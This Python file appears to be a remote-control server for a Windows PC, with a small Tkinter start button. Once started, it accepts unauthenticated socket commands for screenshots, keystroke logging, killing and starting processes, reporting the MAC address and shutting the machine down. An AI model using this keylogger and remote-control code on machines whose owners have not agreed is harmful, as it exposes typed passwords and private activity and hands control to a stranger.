import socket
from PIL import ImageGrab
import base64
import os
import winreg
import psutil
import subprocess
import pynput
import tkinter as tk
import threading
from getmac import get_mac_address as gma

HOST = "0.0.0.0"
PORT = 54321
isConnected = False
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

keyDic = {
    "HKEY_CURRENT_CONFIG": winreg.HKEY_CURRENT_CONFIG,
    "HKEY_CLASSES_ROOT": winreg.HKEY_CLASSES_ROOT,
    "HKEY_CURRENT_USER": winreg.HKEY_CURRENT_USER,
    "HKEY_DYN_DATA": winreg.HKEY_DYN_DATA,
    "HKEY_LOCAL_MACHINE": winreg.HKEY_LOCAL_MACHINE,
    "HKEY_PERFORMANCE_DATA": winreg.HKEY_PERFORMANCE_DATA,
    "HKEY_USERS": winreg.HKEY_USERS,
}

typeDic = {
    "String": winreg.REG_SZ,
    "Binary": winreg.REG_BINARY,
    "Multi-String": winreg.REG_MULTI_SZ,
    "Extendable String": winreg.REG_EXPAND_SZ,
    "DWORD": winreg.REG_DWORD,
    "QWORD": winreg.REG_QWORD,
}


def connect():
    def on_press(key):
        try:
            f.write(str(key.char))
        except AttributeError:
            if(key == pynput.keyboard.Key.space):
                key = " "
            if(key == pynput.keyboard.Key.enter):
                key = "<enter>\n"
            if(key == pynput.keyboard.Key.backspace):
                key = "<backspace>"
            f.write(str(key))

    global s
    s.bind((HOST, PORT))
    s.listen(1)
    try:
        conn, addr = s.accept()
    except:
        return
    try:
        while True:
            encodedData = conn.recv(1024).decode("utf8")
            if encodedData == "*snap*":
                snapshot = ImageGrab.grab()
                file = "scr.jpg"
                snapshot.save(file)
                f = open('scr.jpg', 'rb')
                dataImg = f.read()
                dataImg = base64.b64encode(dataImg)
                f.close()
                os.remove(file)
                conn.sendall(dataImg)
            elif encodedData == "-hello-":
                conn.sendall(bytes("-connected-", "utf8"))
            elif encodedData == "-exit-":
                conn.close()
                break
            elif encodedData == "-getmac-":
                conn.sendall(bytes(gma(), "utf8"))
            elif encodedData == "*close*":
                os.system("shutdown /s /t 1")

            elif encodedData == "see_process":
                res_final = []
                for pro in psutil.process_iter():
                    res = str(pro.name().replace('.exe', '')) + "__" + \
                        str(pro.pid) + "__" + str(pro.num_threads())
                    res_final.append(res)
                str_send = "_a_".join(res_final)
                conn.sendall(bytes(str_send, "utf8"))
            elif encodedData == "kill_process":
                ID_str = conn.recv(1024).decode("utf8")
                ID_kill = int(ID_str)

                check_kill_comp = False
                for pro in psutil.process_iter():
                    if pro.pid == ID_kill:
                        pro.kill()
                        conn.sendall(bytes("kill_success", "utf8"))
                        check_kill_comp = True
                        break
                if not check_kill_comp:
                    conn.sendall(bytes("kill_fail", "utf8"))
            elif encodedData == "start_app" or encodedData == "start_process":
                Name_start = conn.recv(1024).decode("utf8")
                try:
                    os.startfile(Name_start)
                    conn.sendall(bytes("success", "utf8"))
                except:
                    conn.sendall(bytes("error", "utf8"))
            elif encodedData == "see_app":
                cmd = 'powershell "gps | where {$_.MainWindowTitle } | select ProcessName,Id'
                proc = subprocess.Popen(
                    cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    stdin=subprocess.PIPE)
                res = []
                for line in proc.stdout:
                    if line.rstrip():
                        name = line.decode().rstrip()
                        res.append(name)
                res = res[2:]
                ID_res = []
                for text in res:
                    try:
                        ID_res.append(
                            int(text[text.find(" ", 0, len(text)):len(text)].strip(" ")))
                    except:
                        pass
                res_final = []
                for pro in psutil.process_iter():
                    if pro.pid in ID_res:
                        res = str(pro.name().replace('.exe', '')) + "__" + \
                            str(pro.pid) + "__" + str(pro.num_threads())
                        res_final.append(res)
                str_send = "_a_".join(res_final)
                conn.sendall(bytes(str_send, "utf8"))
            elif encodedData == "kill_app":
                cmd = 'powershell "gps | where {$_.MainWindowTitle } | select ProcessName,Id'
                proc = subprocess.Popen(
                    cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    stdin=subprocess.PIPE)
                res = []
                for line in proc.stdout:
                    if line.rstrip():
                        name = line.decode().rstrip()
                        res.append(name)
                res = res[2:]
                ID_res = []
                for text in res:
                    try:
                        ID_res.append(
                            int(text[text.find(" ", 0, len(text)):len(text)].strip(" ")))
                    except:
                        pass
                ID_str = conn.recv(1024).decode("utf8")
                ID_kill = int(ID_str)
                if ID_kill in ID_res:
                    check_kill_comp = False
                    for pro in psutil.process_iter():
                        if pro.pid == ID_kill:
                            pro.kill()
                            conn.sendall(bytes("kill_success", "utf8"))
                            check_kill_comp = True
                            break
                    if not check_kill_comp:
                        conn.sendall(bytes("kill_fail", "utf8"))
                else:
                    conn.sendall(bytes("kill_fail", "utf8"))

            elif encodedData == "hook":
                f = open("keylog.txt", "a", encoding="utf8")
                listener = pynput.keyboard.Listener(on_press=on_press)
                listener.start()
                data = conn.recv(1024).decode("utf8")
                if data == "unhook":
                    listener.stop()
                    listener.join()
                    f.close()
            elif encodedData == "printkey":
                f = open("keylog.txt", "r", encoding="utf8")
                content = f.read()
                if(content == ""):
                    conn.sendall(bytes(" ", "utf8"))
                conn.sendall(bytes(content, "utf8"))
                f.close()
            elif encodedData == "-deletekeylogfile-":
                os.remove("keylog.txt")

    except KeyboardInterrupt:
        conn.close()
    finally:
        conn.close()


def threadConnect():
    global isConnected
    if isConnected:
        return
    isConnected = True
    tConnect = threading.Thread(target=connect, daemon=True)
    tConnect.start()


def threadUI():
    global root
    root.title("Server")
    root.minsize(200, 200)
    openServerBtn = tk.Button(root, text="Mở server",
                              command=threadConnect, width=10, height=5)
    openServerBtn.place(relx=0.5, rely=0.5, anchor=tk.CENTER)


def onClosing():
    if isConnected:
        s.close()
    root.destroy()


root = tk.Tk()
tUI = threading.Thread(target=threadUI, daemon=True)
tUI.start()
root.protocol("WM_DELETE_WINDOW", onClosing)
root.mainloop()
